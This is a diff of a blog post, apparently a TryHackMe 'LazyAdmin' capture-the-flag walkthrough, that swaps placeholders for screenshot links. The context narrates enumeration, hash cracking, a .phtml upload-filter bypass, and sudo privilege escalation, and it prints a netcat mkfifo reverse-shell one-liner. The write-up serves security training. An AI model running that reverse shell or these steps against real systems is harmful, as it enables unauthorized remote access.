@@ -20,7 +20,7 @@ We start off running an Nmap scan to enumerate the open ports
 
 We can see that ports 22 & 80 are open in the nmap scan below
 
-*************** 1
+![img]({{ '/assets/images/1-lazyadmin.png' | relative_url }}){: .center-image }
 
 
 
@@ -32,20 +32,22 @@ Lets enumerated directories and subdirectories with [dirb](https://www.kali.org/
 
 We can see in the screenshot below that there are a few directories of interest
 
-************* 2 
+
+![img]({{ '/assets/images/2-lazyadmin.png' | relative_url }}){: .center-image }
 
 
 Navigating to "/content" show us that this site is running CMS sweetRice and not fully developed
 Lets see if there are any obvious vulnerabilities that have not yet been patched
 
-************** 3
+
+![img]({{ '/assets/images/3-lazyadmin.png' | relative_url }}){: .center-image }
 
 
 Moving further into the directory into the "/content/as" page shows us that there is a login page
 
 
 
-************** 4 
+![img]({{ '/assets/images/4-lazyadmin.png' | relative_url }}){: .center-image }
 
 
 I tested different credentials as well as a sqli injection but did not have any success
@@ -56,23 +58,26 @@ Navigating to "/content/inc" we find a directory list and site map!
 We show 30 different files and direrectories here but one caught my eye... 
 mysql_backup/
 
-************** 5
+
+![img]({{ '/assets/images/5-lazyadmin.png' | relative_url }}){: .center-image }
 
 
 
-*************** 6 
 
+![img]({{ '/assets/images/6-lazyadmin.png' | relative_url }}){: .center-image }
 
 Lets download this file and inspect it ...
 
-*************** 7
+
+![img]({{ '/assets/images/7-lazyadmin.png' | relative_url }}){: .center-image }
 
 
 Looking at this file we can see that it shows us an admin username and hashed password
 
 
 
-*************** 8
+
+![img]({{ '/assets/images/8-lazyadmin.png' | relative_url }}){: .center-image }
 
 
 admin
@@ -85,7 +90,9 @@ Using [haches.com](https://hashes.com/en/decrypt/hash)
 We are able to crack the hash 
 
 
-*************** 9
+
+![img]({{ '/assets/images/9-lazyadmin.png' | relative_url }}){: .center-image }
+
 
 >Password123
 
@@ -93,14 +100,16 @@ Let's try to Login with the new credentials at the login page...
 >Account: manager
 >Password: [cracked hashed password]
 
-*************** 10
+
+![img]({{ '/assets/images/10-lazyadmin.png' | relative_url }}){: .center-image }
 
 SUCCESS !
 
 looking around this page for potential vulnerabilites,
 We can see there is the option to upload files in the "MEDIA CENTER" page
 
-*************** 11
+
+![img]({{ '/assets/images/11-lazyadmin.png' | relative_url }}){: .center-image }
 
 
 Lets try and upload a known malicious file...
@@ -114,18 +123,21 @@ Using [Burpsuite](https://portswigger.net/burp/communitydownload)
 Lets reload and capture the page in order to modify the request
 Let's try to change the request from .php to .phtml and forward the request
 
-*************** 12
+
+![img]({{ '/assets/images/12-lazyadmin.png' | relative_url }}){: .center-image }
 
 We can see that this was succfully uploaded and bypassed the filter
 
-*************** 13
+
+![img]({{ '/assets/images/13-lazyadmin.png' | relative_url }}){: .center-image }
 
 Lets start our listner and navigate to the reverse shell we just uploaded by clicking the link
 WE now get a successful shell on our machine to the target machine
 Lets move into the /home directory and capture our root flag
 
 
-*************** 14
+
+![img]({{ '/assets/images/14-lazyadmin.png' | relative_url }}){: .center-image }
 
 > Flag: THM{redacted}
 
@@ -142,7 +154,8 @@ Running the command above shows that itguy can run a perl script called 'backup.
 It appears to executes a bash script named '/etc/copy.sh'
 Looking inside we see there is a  file which shows a script being run
 
-*************** 15
+
+![img]({{ '/assets/images/15-lazyadmin.png' | relative_url }}){: .center-image }
 
 >rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
 
@@ -155,7 +168,8 @@ Lets modify it to point to our IP and port of our listener
 *Remember we are already connected on the port we originally chose...
 *So we will need to start a second listener and a different port from the first listener we set up
 
-*************** 16 ??
+
+![img]({{ '/assets/images/16-lazyadmin.png' | relative_url }}){: .center-image }
 
 Lets run the command below to start the script
 
@@ -167,7 +181,8 @@ We now get our reverse shell as root !!!
 Lets cat out /root/root.txt to capture the ROOT FLAG
 
 
-*************** 17
+
+![img]({{ '/assets/images/17-lazyadmin.png' | relative_url }}){: .center-image }
 
 We have now captured the root flag and pwnd the machine
 
